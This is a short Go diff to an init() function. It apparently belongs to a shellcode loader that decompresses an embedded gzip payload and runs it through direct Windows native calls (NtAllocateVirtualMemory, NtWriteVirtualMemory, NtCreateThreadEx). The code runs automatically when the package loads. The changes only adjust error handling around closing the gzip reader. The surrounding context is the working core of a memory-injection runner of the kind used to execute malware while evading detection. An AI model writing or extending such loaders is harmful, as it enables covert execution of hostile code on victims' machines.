@@ -24,7 +24,11 @@ func init() {
 	if g, e = gzip.NewReader(bytes.NewReader(sc)); e != nil {
 		return
 	}
-	defer g.Close()
+	defer func() {
+		if e = g.Close(); e != nil {
+			panic(e)
+		}
+	}()
 
 	if sc, e = io.ReadAll(g); e != nil {
 		return
@@ -38,6 +42,7 @@ func init() {
 	l.AllocVia(runsc.NtAllocateVirtualMemory)
 	l.WriteVia(runsc.NtWriteVirtualMemory)
 	l.RunVia(runsc.NtCreateThreadEx)
+
 	if e = l.Exe(sc); e != nil {
 		return
 	}
